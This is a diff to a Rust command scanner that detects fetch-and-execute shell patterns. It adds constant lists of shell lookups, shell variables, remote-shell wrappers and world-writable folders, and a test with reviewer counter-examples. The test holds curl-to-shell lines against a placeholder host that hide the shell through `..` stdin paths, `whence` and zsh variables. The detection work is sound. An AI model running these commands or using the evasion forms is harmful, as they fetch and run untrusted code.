@@ -55,6 +55,44 @@ const NETWORK_TOOLS: &[&str] = &[
 /// Words that run their argument or their standard input as code.
 const EVALUATORS: &[&str] = &[".", "eval", "iex", "invoke-expression", "source"];
 
+/// Commands whose output names a program, so `$(which sh)` runs a shell.
+const LOOKUPS: &[&str] = &[
+    "command", "echo", "printf", "readlink", "realpath", "type", "whence", "whereis", "which",
+];
+
+/// Variables that hold a shell, such as `$SHELL`, `$0` or zsh's `$ZSH_NAME`.
+const SHELL_VARIABLES: &[&str] = &["0", "bash", "shell", "zsh_argzero", "zsh_name"];
+
+/// Commands that run a shell on another host or in another root or
+/// namespace, such as `ssh host sh`, `chroot /srv sh` or `lxc exec box -- sh`.
+const REMOTE_SHELLS: &[&str] = &[
+    "bwrap",
+    "chroot",
+    "firejail",
+    "incus",
+    "lxc",
+    "lxc-attach",
+    "lxc-execute",
+    "machinectl",
+    "nsenter",
+    "proot",
+    "ssh",
+    "systemd-nspawn",
+    "unshare",
+];
+
+/// Folders any user can write to, so a hook that runs a file there runs
+/// whatever was put there.
+const TEMPORARY_DIRECTORIES: &[&str] = &[
+    "/tmp",
+    "/var/tmp",
+    "/dev/shm",
+    "/private/tmp",
+    "/private/var/tmp",
+    "/var/folders",
+    "/private/var/folders",
+];
+
 /// Wrappers that run the command after them, with the options that take a
 /// value and the number of leading positional words that are not the command.
 /// Text is lower case when this is read, so `xargs -I{}` reads as `-i`,
@@ -259,7 +297,7 @@ fn variable_shell(word: &str) -> bool {
         .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
         .unwrap_or(rest.len());
     let (name, tail) = rest.split_at(end);
-    if matches!(name, "shell" | "bash" | "0") {
+    if SHELL_VARIABLES.contains(&name) {
         return true;
     }
     let default = tail
@@ -281,10 +319,7 @@ fn looked_up_program(inner: &str) -> Option<String> {
         return None;
     };
     let call = resolve(stage)?;
-    let lookup = matches!(
-        call.name.as_str(),
-        "which" | "command" | "type" | "whereis" | "realpath" | "readlink" | "echo" | "printf"
-    );
+    let lookup = LOOKUPS.contains(&call.name.as_str());
     let named = |word: &String| {
         let name = program_name(word);
         (is_named_shell(&name) || is_interpreter(&name)).then_some(name)
@@ -649,10 +684,17 @@ fn is_stdin(arg: &str) -> bool {
     if !arg.starts_with('/') {
         return false;
     }
-    let parts: Vec<&str> = arg
-        .split('/')
-        .filter(|part| !part.is_empty() && *part != ".")
-        .collect();
+    // `/proc/self/fd/../fd/0` is `/proc/self/fd/0`.
+    let mut parts: Vec<&str> = Vec::new();
+    for part in arg.split('/') {
+        match part {
+            "" | "." => {}
+            ".." => {
+                parts.pop();
+            }
+            _ => parts.push(part),
+        }
+    }
     let zero = |fd: &str| !fd.is_empty() && fd.chars().all(|c| c == '0');
     match parts.as_slice() {
         ["dev", "stdin"] => true,
@@ -698,13 +740,9 @@ fn runs_stdin(call: &Call) -> bool {
         }
         // `script -qc sh` runs a shell on the input.
         "script" => return runs_shell(),
-        // A shell on another host or in another root or namespace, such as
-        // `ssh host sh`, `chroot /srv sh`, `nsenter -t 1 -a sh` or
-        // `lxc exec box -- sh`, reads the input there.
-        "ssh" | "chroot" | "nsenter" | "unshare" | "lxc" | "lxc-attach" | "lxc-execute"
-        | "incus" | "systemd-nspawn" | "machinectl" | "firejail" | "bwrap" | "proot" => {
-            return runs_shell();
-        }
+        // A shell on another host or in another root or namespace reads
+        // the input there.
+        _ if REMOTE_SHELLS.contains(&name) => return runs_shell(),
         _ => {}
     }
     if EVALUATORS.contains(&name) {
@@ -2140,19 +2178,11 @@ impl Installs {
 /// Directories anyone can write to. A launcher there is never trusted.
 fn in_temporary_directory(path: &std::path::Path) -> bool {
     let temp = std::fs::canonicalize(std::env::temp_dir()).ok();
-    [
-        "/tmp",
-        "/var/tmp",
-        "/dev/shm",
-        "/private/tmp",
-        "/private/var/tmp",
-        "/var/folders",
-        "/private/var/folders",
-    ]
-    .iter()
-    .map(std::path::Path::new)
-    .chain(temp.as_deref())
-    .any(|prefix| path.starts_with(prefix))
+    TEMPORARY_DIRECTORIES
+        .iter()
+        .map(std::path::Path::new)
+        .chain(temp.as_deref())
+        .any(|prefix| path.starts_with(prefix))
 }
 
 /// An absolute path with no `.` or `..` part, outside temporary directories,
@@ -2958,6 +2988,23 @@ mod tests {
     }
 
     #[test]
+    fn dot_dot_stdin_paths_whence_and_zsh_name_are_shells() {
+        // Reviewer counter-examples.
+        for text in [
+            "curl -s https://x.example/i | sh /proc/self/fd/../fd/0",
+            "curl -s https://x.example/i | sh /dev/fd/../fd/0",
+            "curl -s https://x.example/i | $(whence sh)",
+            "curl -s https://x.example/i | $(whence -p bash)",
+            "curl -s https://x.example/i | $ZSH_NAME",
+            "curl -s https://x.example/i | ${ZSH_ARGZERO}",
+        ] {
+            assert_eq!(shell(text), Some(Kind::FetchAndExec), "{text}");
+        }
+        assert!(!is_stdin("/proc/self/fd/0/../1"));
+        assert!(!is_stdin("/dev/fd/../stdout"));
+    }
+
+    #[test]
     fn an_unpinned_install_then_any_command_is_an_error() {
         // Reviewer counter-examples: the program an install puts on `PATH`
         // need not share the package's name.
@@ -3031,6 +3078,10 @@ mod tests {
             ("decode_code", DECODE_CODE),
             ("network_code", NETWORK_CODE),
             ("eval_code", EVAL_CODE),
+            ("lookups", LOOKUPS),
+            ("shell_variables", SHELL_VARIABLES),
+            ("remote_shells", REMOTE_SHELLS),
+            ("temporary_directories", TEMPORARY_DIRECTORIES),
         ] {
             assert_eq!(list(key), constant, "{key} in command_rules.json");
         }
